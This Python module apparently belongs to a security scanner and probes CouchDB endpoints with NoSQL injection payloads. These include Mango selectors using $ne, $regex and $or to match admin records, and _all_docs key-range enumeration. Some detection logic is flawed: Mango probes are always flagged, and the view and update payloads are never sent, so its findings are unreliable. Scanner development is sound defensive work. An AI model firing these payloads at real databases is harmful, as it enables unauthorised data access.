"""CouchDB-specific NoSQL injection probes.

Covers Mango query injection in _find and _all_docs range abuse
via startkey/endkey.
"""

from __future__ import annotations

import json
import re
from typing import Any

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature

from ._confidence import probe_confidence, probe_severity

_COUCHDB_ERROR_RE = re.compile(
    r"(?i)(?:couchdb|couch|mango|not_a_valid|invalid operator|"
    r"query_parse_error|no_matching_index|unknown_error|"
    r"bad_match|bad_range|invalid UTF-8 JSON|bad_request)"
)

_COUCHDB_MANGO_INJECTION: list[tuple[str, dict[str, Any]]] = [
    (
        "mango_selector_or_true",
        {
            "selector": {
                "username": {"$or": [{"$gt": ""}, {"$eq": "admin"}]},
            }
        },
    ),
    (
        "mango_selector_ne_null",
        {
            "selector": {
                "username": {"$ne": None},
                "password": {"$ne": None},
            }
        },
    ),
    (
        "mango_selector_regex",
        {
            "selector": {
                "username": {"$regex": ".*"},
            }
        },
    ),
    (
        "mango_selector_gt",
        {
            "selector": {
                "username": {"$gt": ""},
            }
        },
    ),
    (
        "mango_selector_in",
        {
            "selector": {
                "role": {"$in": ["admin", "root", "superuser"]},
            }
        },
    ),
    (
        "mango_selector_exists",
        {
            "selector": {
                "username": {"$exists": True},
            }
        },
    ),
    (
        "mango_selector_type",
        {
            "selector": {
                "username": {"$type": "string"},
            }
        },
    ),
    (
        "mango_selector_size",
        {
            "selector": {
                "username": {"$size": 1},
            }
        },
    ),
]

_COUCHDB_ALL_DOCS_RANGE: list[tuple[str, dict[str, Any]]] = [
    (
        "alldocs_startkey_admin",
        {"startkey": "admin", "limit": 10},
    ),
    (
        "alldocs_endkey_root",
        {"endkey": "root", "limit": 10},
    ),
    (
        "alldocs_startkey_endkey",
        {"startkey": "a", "endkey": "z", "limit": 10},
    ),
    (
        "alldocs_startkey_endkey_inclusive",
        {"startkey": "admin", "endkey": "user", "inclusive_end": True, "limit": 10},
    ),
    (
        "alldocs_startkey_endkey_exclusive",
        {"startkey": "admin", "endkey": "user", "inclusive_end": False, "limit": 10},
    ),
    (
        "alldocs_descending",
        {"startkey": "zzz", "endkey": "aaa", "descending": True, "limit": 10},
    ),
]

_COUCHDB_VIEW_INJECTION: list[tuple[str, dict[str, Any]]] = [
    (
        "view_key_all",
        {"key": "admin"},
    ),
    (
        "view_key_start",
        {"startkey": "admin"},
    ),
    (
        "view_key_end",
        {"endkey": "root"},
    ),
    (
        "view_key_range",
        {"startkey": "a", "endkey": "z"},
    ),
]

_COUCHDB_UPDATE_HANDLERS: list[tuple[str, dict[str, Any]]] = [
    (
        "update_docid",
        {"_id": "admin"},
    ),
    (
        "update_rev",
        {"_rev": "1-abc"},
    ),
]


def nosql_couchdb_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: Any,
    limit: int = 30,
) -> list[dict[str, Any]]:
    """CouchDB-specific NoSQL injection probes.

    Tests for:
    - Mango query injection in _find endpoint ($or, $ne, $regex, $gt, $in, $exists, $type, $size)
    - _all_docs range abuse via startkey/endkey
    - View key injection
    - Document update handler abuse

    Args:
        priority_urls: List of URL dicts.
        response_cache: HTTP response cache.
        limit: Maximum findings.

    Returns:
        List of CouchDB NoSQL injection findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    all_payloads: list[tuple[str, dict[str, Any], str]] = []

    for payload_name, payload_body in _COUCHDB_MANGO_INJECTION:
        all_payloads.append((payload_name, payload_body, "mango"))

    for payload_name, payload_body in _COUCHDB_ALL_DOCS_RANGE:
        all_payloads.append((payload_name, payload_body, "alldocs"))

    for payload_name, payload_body in _COUCHDB_VIEW_INJECTION:
        all_payloads.append((payload_name, payload_body, "view"))

    for payload_name, payload_body in _COUCHDB_UPDATE_HANDLERS:
        all_payloads.append((payload_name, payload_body, "update"))

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break

        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        baseline = response_cache.get(url)
        baseline_status = int(baseline.get("status_code") or 0) if baseline else 0
        baseline_len = len(str(baseline.get("body_text") or "")) if baseline else 0

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        is_couchdb = "couch" in url.lower() or "5984" in url
        if not is_couchdb:
            check = response_cache.get(url)
            if check:
                body = str(check.get("body_text") or "")
                if not _COUCHDB_ERROR_RE.search(body) and "couchdb" not in body.lower():
                    continue

        for payload_name, payload_body, category in all_payloads:
            if len(url_probes) >= 4:
                break

            is_mango = category == "mango"
            is_alldocs = category == "alldocs"

            if is_mango:
                test_url = url.rstrip("/") + "/_find"
                method = "POST"
                headers = {
                    "Cache-Control": "no-cache",
                    "Content-Type": "application/json",
                    "X-CouchDB-Probe": "1",
                }
                body = json.dumps(payload_body)
            elif is_alldocs:
                from urllib.parse import urlencode, urlparse, urlunparse

                parsed = urlparse(url)
                qs = urlencode(payload_body)
                test_url = urlunparse(parsed._replace(query=qs))
                method = "GET"
                headers = {"Cache-Control": "no-cache", "X-CouchDB-Probe": "1"}
                body = ""
            else:
                test_url = url
                method = "GET"
                headers = {"Cache-Control": "no-cache", "X-CouchDB-Probe": "1"}
                body = ""

            response = response_cache.request(
                test_url,
                method=method,
                headers=headers,
                body=body,
            )
            if not response:
                continue

            rbody = str(response.get("body_text", "") or "")[:8000]
            status = int(response.get("status_code") or 0)
            response_len = len(rbody)
            error_match = _COUCHDB_ERROR_RE.search(rbody)

            issues_for_hit: list[str] = []

            if error_match:
                issues_for_hit.append("couchdb_error_pattern")
            if is_mango:
                issues_for_hit.append("couchdb_mango_injection")
            if is_alldocs and status == 200:
                issues_for_hit.append("couchdb_alldocs_range")
            if status == 200 and response_len > baseline_len * 1.5 and baseline_len > 0:
                issues_for_hit.append("couchdb_data_exposure")

            if issues_for_hit:
                url_issues.extend(issues_for_hit)
                url_probes.append(
                    {
                        "payload_type": payload_name,
                        "category": category,
                        "payload": payload_body,
                        "endpoint": test_url,
                        "baseline_status": baseline_status,
                        "response_status": status,
                        "baseline_length": baseline_len,
                        "response_length": response_len,
                        "issues": issues_for_hit,
                        "error_pattern": error_match.group(0) if error_match else None,
                    }
                )

        if url_probes:
            unique_issues = list(dict.fromkeys(url_issues))
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": unique_issues,
                    "probes": url_probes,
                    "confidence": probe_confidence(unique_issues),
                    "severity": probe_severity(unique_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
